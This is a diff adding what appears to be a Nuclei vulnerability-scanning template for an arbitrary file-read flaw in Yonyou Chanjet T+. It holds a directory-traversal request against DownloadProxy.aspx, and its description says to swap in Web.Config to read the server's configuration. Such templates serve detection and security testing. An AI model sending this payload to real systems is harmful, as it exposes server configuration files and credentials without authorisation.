@@ -1,0 +1,30 @@
+id: 用友 畅捷通任意文件读取
+
+info:
+  name: 用友 畅捷通任意文件读取
+  author: ritikchaddha
+  severity: critical
+  description: 用友 畅捷通任意文件读取,更改后边的文件为Web.Config
+  tags: yonyou
+  metadata:
+    max-request: 1
+
+
+http:
+  - method: 
+      - GET
+    path:
+      - '{{BaseURL}}/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../xinxinxinxinxinxinxin.Config'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '9'
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/09/28
